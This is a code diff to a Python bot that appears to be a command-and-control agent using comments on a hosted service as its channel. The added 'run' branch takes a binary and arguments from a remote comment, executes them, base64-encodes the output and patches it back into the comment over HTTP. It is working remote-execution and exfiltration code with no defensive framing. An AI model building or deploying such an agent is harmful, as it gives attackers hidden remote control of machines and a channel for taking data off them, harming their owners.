@@ -59,6 +59,19 @@ class Bot:
                             stdout=subprocess.PIPE,
                         )
                         data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
+                    elif command == cmd.COMMAND_RUN["command"]:
+                        arguments_str = self.get_command_argument(comment["body"])
+                        arguments = arguments_str.split(" ")
+                        if not os.path.isfile(arguments[0]):
+                            data = u.encode_data_to_markdown(
+                                u.encode_data_to_base64("Binary not found".encode(encoding="UTF-8"))
+                            )
+                        else:
+                            result = subprocess.run(
+                                arguments,
+                                stdout=subprocess.PIPE,
+                            )
+                            data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
 
                     data = {"body": comment["body"] + "\n" + data}
                     res = requests.patch(
